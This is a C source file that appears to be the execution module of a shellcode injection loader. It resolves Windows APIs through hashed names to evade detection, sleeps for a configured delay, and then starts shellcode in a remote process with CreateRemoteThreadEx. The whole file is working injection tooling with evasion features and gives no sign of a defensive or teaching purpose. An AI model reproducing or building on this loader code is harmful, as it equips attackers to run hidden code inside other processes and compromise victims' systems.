#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"



BOOL execution_load_apis() {
	g_ldr->apis->CreateRemoteThreadEx = (pCreateRemoteThreadEx)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEREMOTETHREADEX);
	g_ldr->apis->NtWaitForSingleObject = (pNtWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_NTWAITFORSINGLEOBJECT);
	return TRUE;
}

BOOL execution_run(MemoryInfo memInfo) {
	ldr_sleep(g_ldr->config->DelayBefore);
	HANDLE hThread = g_ldr->apis->CreateRemoteThreadEx(memInfo.remoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memInfo.ShellCodeAddress,
		NULL,
		0, NULL, NULL);
	if (hThread == NULL) return FALSE;
	g_ldr->apis->NtWaitForSingleObject(hThread, FALSE, NULL);

	return TRUE;
}


